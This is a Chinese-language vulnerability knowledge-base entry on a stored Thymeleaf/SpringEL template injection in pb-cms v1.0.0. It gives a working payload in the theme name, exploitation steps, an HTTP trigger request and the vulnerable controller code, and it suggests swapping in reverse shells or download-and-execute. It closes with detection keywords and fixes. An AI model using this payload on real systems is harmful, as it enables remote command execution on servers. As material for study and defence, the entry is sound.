---
id: web-java-expression-spel-thymeleaf-theme-name-stored-ssti
title: Thymeleaf 主题名存储型 SSTI：后台写入 __${...}__ 主题，首页拼接模板路径触发命令执行
type: scenario
domain: web
path: web/java/expression/spel
technique: thymeleaf-theme-name-stored-ssti
aliases:
- pb-cms 主题名 SSTI
- Thymeleaf 主题名注入
- 存储型 Thymeleaf SSTI
- 后台主题名 RCE
- 模板路径拼接 SSTI
- __${}__ 主题名
tags:
- ssti
- thymeleaf
- spel
- spring
- stored
- view-name
- rce
cve: []
severity: high
confidence: high
status: verified
affected_versions: pb-cms v1.0.0（原文项目/版本）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V35
  verified_at: '2026-11-05T05:59:58+08:00'
  notes: 已对照原文核对：主题key=__${T(Runtime).getRuntime().exec("calc")}__::.x 落库、BlogWebController#index 拼接 THEME_PREFIX+selectCurrent().getName()+"/index"、首页触发 calc 均有截图；未在本机复现，依赖 pb-cms v1.0.0 环境。
---

## 一句话结论

某瀑布内容管理系统（pb-cms）的首页控制器把当前主题名拼进 Thymeleaf 模板路径 `THEME_PREFIX + themeName + "/index"`；后台新增主题时主题名未过滤，写入 `__${T(Runtime).getRuntime().exec("calc")}__::.x` 并启用后，访问首页就会在视图名预处理阶段执行 SpringEL，弹出计算器。

## 原理

- **存储点**：后台“主题管理”新增主题时，`主题key/名称` 字段直接保存到数据库；原文把主题 key 设为 `__${T(Runtime).getRuntime().exec("calc")}__::.x`，描述随意。
- **读取点**：`BlogWebController#index` 返回 `THEME_PREFIX + bizThemeService.selectCurrent().getName() + "/index"`；`selectCurrent()` 取当前启用的主题，其 `name` 就是攻击者写入的字符串。
- **触发层**：Spring MVC 把返回字符串当视图名交给 `ThymeleafViewResolver`；Thymeleaf 在解析模板前会对视图名做 `__${...}__` 预处理，把内部表达式求值后替换回视图名。`::.x` 是片段选择器，保证预处理结果能参与视图解析。
- **表达式能力**：Spring 环境下 Thymeleaf 使用 SpringEL，`T(Runtime)` 可引用 `java.lang.Runtime`，`getRuntime().exec("calc")` 直接执行系统命令；也可读文件、调用 Spring Bean。
- **为什么是存储型**：payload 不在请求参数里，而是先落库、再被首页读取；普通访问首页的请求就会触发，不需要攻击者每次携带表达式。要求攻击者能进入后台主题管理（管理员或被授权的低权账号）。
- **与直接视图名 SSTI 的区别**：入口不是 `return request.getParameter(...)`，而是“数据库中的主题名 → 模板路径拼接”，属于二次/存储型触发，检测时不能只盯请求参数。

## 触发条件

- 目标为 pb-cms v1.0.0（或同样把主题/皮肤名拼进 Thymeleaf 模板路径的实现）。
- 攻击者可访问后台主题管理并新增/编辑主题（管理员权限或越权）。
- 主题名未做字符白名单，允许 `$`、`{`、`}`、`__`、`::` 等。
- 主题被启用（`selectCurrent()` 返回该主题），且首页模板解析走 Thymeleaf 视图解析器。
- 服务端 SpringEL 未使用受限上下文，允许 `T(...)` 类型引用。

## 利用步骤

1. 进入后台“主题管理”，新增主题。
2. 主题 key/名称填 `__${T(Runtime).getRuntime().exec("calc")}__::.x`，描述、图片等随意。
3. 保存并“启用”该主题，使其成为当前主题。
4. 访问站点首页 `/cms/`（或对应 context-path 根路径）。
5. 首页控制器拼接主题名并返回模板路径，Thymeleaf 预处理执行表达式，命令运行。
6. 将 `calc` 换成反弹 Shell、下载执行、读文件等；也可用 `T(java.lang.ProcessBuilder)` 或 Spring Bean 引用。

## PoC

后台新增主题：

```text
主题key: __${T(Runtime).getRuntime().exec("calc")}__::.x
主题描述: sb123
主题图片: sb123
```

启用后访问：

```http
GET /cms/ HTTP/1.1
Host: target:8080
```

触发点代码：

```java
@GetMapping("/")
public String index(Model model, ArticleConditionVo vo) {
    model.addAttribute("pageUrl", "blog/index");
    model.addAttribute("categoryId", "index");
    model.addAttribute("sliderList", bizArticleService.sliderList());
    loadMainPage(model, vo);
    return THEME_PREFIX + bizThemeService.selectCurrent().getName() + "/index";
}
```

调试时 `bizThemeService.selectCurrent().getName()` 的值为 `__${T(Runtime).getRuntime().exec("calc")}__::.x`，访问首页即弹出计算器。

## 变体与关联

- 变体：主题描述、皮肤名、模板目录名等其他持久化字段若进入视图名/模板路径，同样可注入。
- 变体：若后台支持上传主题包并解压，可结合文件上传覆盖模板，形成“模板内容层”SSTI。
- 变体：`__${...}__::x`、`__|${...}|__` 等预处理/字面量替换组合；`T(java.lang.Runtime)`、`T(java.lang.ProcessBuilder)`、Spring Bean 引用。
- 关联：[[web-java-expression-spel-thymeleaf-viewname-preprocessing-ssti]]（同一视图名预处理 sink，那条入口是请求参数直接作为 viewName；本条是数据库主题名二次触发）。
- 关联：[[web-java-expression-spel-ruoyi-thymeleaf-fragment-ssti]]（Thymeleaf 片段表达式 SSTI 与绕过）。

## 检测与防御

- **检测**：主题/皮肤/模板名称字段出现 `__${`、`}`、`::`、`T(`、`Runtime`、`ProcessBuilder`；首页请求返回异常模板错误或进程拉起 `calc`/`sh`；数据库主题表中出现表达式字符串。
- **检测**：模板路径拼接处出现用户可控字段；Thymeleaf 解析异常堆栈含 `ExpressionParsingUtil`/`SpelExpression`。
- **修复**：主题名使用固定枚举/白名单映射，禁止表达式字符；不要把用户输入拼进视图名或模板路径，改用固定的模板 ID 到路径映射。
- **加固**：后台主题管理仅管理员可用并二次校验；Thymeleaf 使用受限 `EvaluationContext`，禁用 `T()` 类型访问与 Bean 引用；模板目录只读；对后台输入做存储前校验。
